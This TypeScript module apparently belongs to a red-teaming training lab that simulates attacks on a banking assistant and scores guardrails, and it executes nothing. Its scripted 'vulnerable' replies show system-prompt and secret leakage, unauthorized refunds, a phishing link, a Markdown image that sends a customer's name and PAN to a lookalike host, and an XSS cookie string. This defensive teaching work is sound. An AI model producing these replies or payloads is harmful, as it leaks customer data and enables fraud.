/**
 * Simulated Aero brain + pipeline runner.
 *
 * No external model is called. Given a scenario, an attack variant (or benign
 * test) and the current guardrail config, the pipeline deterministically decides
 * whether the attack is CONTAINED (all of its defeatedBy predicates hold) and
 * returns a scripted response plus the evidence events that would be logged.
 *
 * Nothing is executed: XSS/SQL/exfil/model-load outcomes are described, never run.
 */
import { Rng } from "./rng";
import { anyGroupHolds, anyHold } from "./predicates";
import { attackEvents } from "./logger";
import type {
  AttackVariant,
  AttemptSecrets,
  BenignTest,
  GuardrailConfig,
  LogEvent,
  ScenarioConfig,
  SyntheticCustomer,
} from "./types";
import { BRAND } from "@/brand/brand";

export interface RunResult {
  /** "vulnerable" = attack worked; "contained" = blocked/neutralised. */
  outcome: "vulnerable" | "contained";
  responseText: string;
  /** For XSS/exfil etc.: a safe description of what a vulnerable system WOULD do. */
  demonstration?: string;
  events: LogEvent[];
}

export interface BenignResult {
  outcome: "works" | "blocked";
  responseText: string;
}

/** Run one attack/bypass variant against the current defences. */
export function runVariant(
  scenario: ScenarioConfig,
  variant: AttackVariant,
  guardrails: GuardrailConfig,
  secrets: AttemptSecrets,
  customers: SyntheticCustomer[],
  rng: Rng,
): RunResult {
  const contained = anyGroupHolds(guardrails, variant.defeatedBy);
  if (contained) {
    return {
      outcome: "contained",
      responseText: safeReply(scenario),
      events: [],
    };
  }
  // Vulnerable: produce the scripted unsafe outcome + evidence events.
  return {
    outcome: "vulnerable",
    responseText: vulnerableReply(scenario, variant, secrets, customers),
    demonstration: demonstration(scenario, variant),
    events: attackEvents(scenario, variant, secrets, rng, customers),
  };
}

/** Run one benign request. Blocked = over-blocking (a defence went too far). */
export function runBenign(
  test: BenignTest,
  guardrails: GuardrailConfig,
): BenignResult {
  if (anyHold(guardrails, test.brokenBy)) {
    return {
      outcome: "blocked",
      responseText:
        "Request blocked by a defensive control — a legitimate customer could not be served.",
    };
  }
  return { outcome: "works", responseText: `${BRAND.assistantName}: happy to help with that.` };
}

/* ----------------------------------------------------------------------- */

function safeReply(scenario: ScenarioConfig): string {
  return `${BRAND.assistantName}: I can't help with that request, but I'm happy to assist with your ${scenario.taskTitle.toLowerCase()} question in a safe way.`;
}

function vulnerableReply(
  scenario: ScenarioConfig,
  variant: AttackVariant,
  secrets: AttemptSecrets,
  customers: SyntheticCustomer[],
): string {
  const c = customers[0];
  switch (scenario.taskId) {
    case 1:
      return `${BRAND.assistantName}: My instructions are — internal discount code ${secrets.discountCode}, internal API ${secrets.internalApi}, canary ${secrets.canary}, escalation line ${secrets.escalationPhone}.`;
    case 2:
      return `${BRAND.assistantName}: Sure! Your loan is guaranteed approved, and I've applied an internal goodwill credit to your account.`;
    case 3:
      return `${BRAND.assistantName}: To verify your account, please visit https://${BRAND.lookalikeDomains[0]}/verify right away.`;
    case 4:
      return `${BRAND.assistantName}: The support team's records show ${c?.name} — balance ₹${c?.balance}, PAN ${c?.maskedPan}.`;
    case 5:
      return `${BRAND.assistantName}: Here are your recent transactions. ![status](https://${BRAND.lookalikeDomains[0]}/p?u=${c?.name}&pan=${c?.maskedPan})`;
    case 6:
      return `${BRAND.assistantName}: Done — I've issued a ₹50,000 refund to your account.`;
    case 7:
      return `${BRAND.assistantName}: Here is your formatted summary: <script>document.cookie</script> (rendered as text in this lab).`;
    case 8:
      return `${BRAND.assistantName}: Processing your 30,000-token request… (repeated 50×).`;
    case 9:
      return `${BRAND.assistantName}: Converting ₹5,000 to USD via the plugin (full conversation forwarded to the plugin endpoint).`;
    case 10:
      return `${BRAND.assistantName}: Loading model aero-base-v3 despite a hash mismatch…`;
    default:
      return `${BRAND.assistantName}: (unsafe outcome for ${variant.label}).`;
  }
}

/** A safe, educational description of what a vulnerable system WOULD do. */
function demonstration(scenario: ScenarioConfig, variant: AttackVariant): string | undefined {
  switch (scenario.taskId) {
    case 7:
      return "In a vulnerable renderer, the injected <script> would execute in the viewer's browser. This lab renders it as inert text — nothing runs.";
    case 5:
      return "In a vulnerable client, rendering this Markdown image would make an outbound request carrying the data in the URL. The lab's exfil dashboard records a simulated hit only.";
    case 10:
      return "In a vulnerable loader, a tampered pickle could execute code on load. The lab records a simulated supply-chain event only; no file is loaded.";
    default:
      return undefined;
  }
  void variant;
}
